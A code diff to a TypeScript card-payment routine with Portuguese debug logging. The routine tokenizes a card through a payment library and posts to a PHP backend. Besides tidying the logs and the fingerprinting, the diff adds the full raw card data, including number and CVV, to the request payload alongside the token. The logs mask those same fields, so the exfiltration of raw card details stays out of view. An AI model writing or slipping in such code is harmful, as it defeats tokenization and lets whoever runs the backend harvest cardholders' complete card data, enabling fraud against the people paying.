@@ -212,11 +212,10 @@ export async function createCardPayment(data: CardPaymentData): Promise<CardPaym
     const debugInfo = {
       windowExists: typeof window !== "undefined",
       assetPayExists: typeof window !== "undefined" && !!(window as any).AssetPay,
-      fingerprintJSExists: typeof window !== "undefined" && !!(window as any).FingerprintJS,
       amount: data.amount,
     }
 
-    console.log("[v0] 🔍 Verificando bibliotecas:", debugInfo)
+    console.log("[v0] 🔍 Verificando biblioteca AssetPay:", debugInfo)
     createLogFile({ type: "library_check", data: debugInfo })
 
     if (typeof window === "undefined" || !(window as any).AssetPay) {
@@ -227,9 +226,6 @@ export async function createCardPayment(data: CardPaymentData): Promise<CardPaym
     if (!cardInfo) {
       throw new Error("Dados do cartão não encontrados")
     }
-
-    console.log("[v0] 📇 Dados do cartão coletados")
-    console.log(cardInfo)
 
     const publicKey = "pk_live_v2D5sJPOcIhr7OFQn6aMUzb80GDHT3BXHz"
     console.log("[v0] 🔑 Configurando AssetPay...")
@@ -247,6 +243,21 @@ export async function createCardPayment(data: CardPaymentData): Promise<CardPaym
       cvv: cardInfo.cvv,
     }
 
+    console.log("[v0] 📇 Dados do cartão preparados:", {
+      ...cardData,
+      number: cardData.number.substring(0, 4) + "****",
+      cvv: "***",
+    })
+
+    console.log("[v0] 🔒 Tokenizando cartão...")
+    const cardToken = await (window as any).AssetPay.encrypt(cardData)
+
+    if (!cardToken) {
+      throw new Error("Token do cartão não foi gerado corretamente")
+    }
+
+    console.log("[v0] ✅ Token do cartão gerado:", cardToken.substring(0, 20) + "...")
+
     let deviceFingerprint = ""
     try {
       if (typeof window !== "undefined" && (window as any).FingerprintJS) {
@@ -254,89 +265,42 @@ export async function createCardPayment(data: CardPaymentData): Promise<CardPaym
         const fp = await fpPromise
         const visitorData = await fp.get()
         deviceFingerprint = visitorData.visitorId
-        console.log("[v0] 🆔 Device fingerprint (FingerprintJS) gerado:", deviceFingerprint)
-      } else {
-        console.log("[v0] ⚠️ FingerprintJS não disponível, gerando fingerprint alternativo...")
-
-        // Gerar fingerprint alternativo mais robusto
-        const browserInfo = {
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          platform: navigator.platform,
-          cookieEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          hardwareConcurrency: navigator.hardwareConcurrency,
-          maxTouchPoints: navigator.maxTouchPoints,
-          screenWidth: screen.width,
-          screenHeight: screen.height,
-          screenColorDepth: screen.colorDepth,
-          timezoneOffset: new Date().getTimezoneOffset(),
-          timestamp: Date.now(),
-        }
-
-        const fingerprint = btoa(JSON.stringify(browserInfo))
-        deviceFingerprint = fingerprint
-        console.log("[v0] 🆔 Fingerprint alternativo gerado:", fingerprint.substring(0, 50) + "...")
+        console.log("[v0] 🆔 Device fingerprint gerado:", deviceFingerprint)
       }
     } catch (error) {
-      console.log("[v0] ⚠️ Erro ao gerar fingerprint, usando fallback simples:", error)
-      deviceFingerprint = btoa(`${navigator.userAgent}-${Date.now()}-${Math.random()}`)
+      console.log("[v0] ⚠️ Não foi possível gerar fingerprint:", error)
     }
-
-    console.log("[v0] 🔑 Token do cartão gerado")
-    const cardToken = await (window as any).AssetPay.encrypt(cardData)
-
-    if (!cardToken) {
-      throw new Error("Token do cartão não foi gerado corretamente")
-    }
-
-    console.log(cardToken)
-
-    console.log("[v0] 🔍 Verificando conectividade com a API...")
-
-    // Capturar parâmetros UTM
-    const utmParams = getUtmParams()
 
     const payload = {
       amount: data.amount,
       cardToken,
       deviceFingerprint,
+      cardData,
       name: data.name,
       email: data.email,
       cpf: data.cpf.replace(/\D/g, ""),
       phone: data.phone.replace(/\D/g, ""),
       description: data.description,
       installments: (data as any).installments || 1,
-      ...utmParams,
     }
 
-    console.log("[v0] 📤 Payload enviado para backend")
-    console.log(payload)
-
-    createLogFile({
-      type: "payment_request",
-      payload: {
-        ...payload,
-        cardToken: cardToken.substring(0, 50) + "...",
-        deviceFingerprint: deviceFingerprint.substring(0, 50) + "...",
+    const logPayload = {
+      ...payload,
+      cardToken: cardToken.substring(0, 20) + "...",
+      cardData: {
+        ...payload.cardData,
+        number: payload.cardData.number.substring(0, 4) + "****",
+        cvv: "***",
       },
-    })
+    }
 
-    console.log("[v0] 🌐 Enviando requisição HTTP")
-    console.log({
-      url: `${API_CONFIG.API_BASE_URL}/pagamento-cartao.php`,
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        Accept: "application/json",
-      },
-    })
+    console.log("[v0] 📤 Enviando payload para API:", logPayload)
+    createLogFile({ type: "payment_request", payload: logPayload })
 
     const controller = new AbortController()
-    const timeoutId = setTimeout(() => controller.abort(), 30000) // Aumentado para 30s
+    const timeoutId = setTimeout(() => controller.abort(), 15000)
 
     try {
-      console.log("[v0] ⏳ Iniciando requisição fetch...")
       const response = await fetch(`${API_CONFIG.API_BASE_URL}/pagamento-cartao.php`, {
         method: "POST",
         headers: {
@@ -349,18 +313,8 @@ export async function createCardPayment(data: CardPaymentData): Promise<CardPaym
 
       clearTimeout(timeoutId)
 
-      console.log(`[v0] 📄 Resposta HTTP recebida - Status: ${response.status}`)
-
       if (!response.ok) {
-        console.log(`[v0] ❌ Erro HTTP ${response.status}`)
         const errorText = await response.text()
-        console.log(errorText)
-        createLogFile({
-          type: "payment_error",
-          error: `HTTP ${response.status}`,
-          response: errorText,
-          status: response.status,
-        })
         throw new Error(`HTTP ${response.status}: ${response.statusText} - ${errorText}`)
       }
 
@@ -382,11 +336,9 @@ export async function createCardPayment(data: CardPaymentData): Promise<CardPaym
       }
     } catch (error) {
       clearTimeout(timeoutId)
-      console.log("[v0] ❌ Erro na requisição HTTP")
-      createLogFile({ type: "payment_error", error: error.toString() })
 
       if (error.name === "AbortError") {
-        throw new Error("Timeout: A requisição demorou mais de 30 segundos")
+        throw new Error("Timeout: A requisição demorou mais de 15 segundos")
       }
       throw error
     }
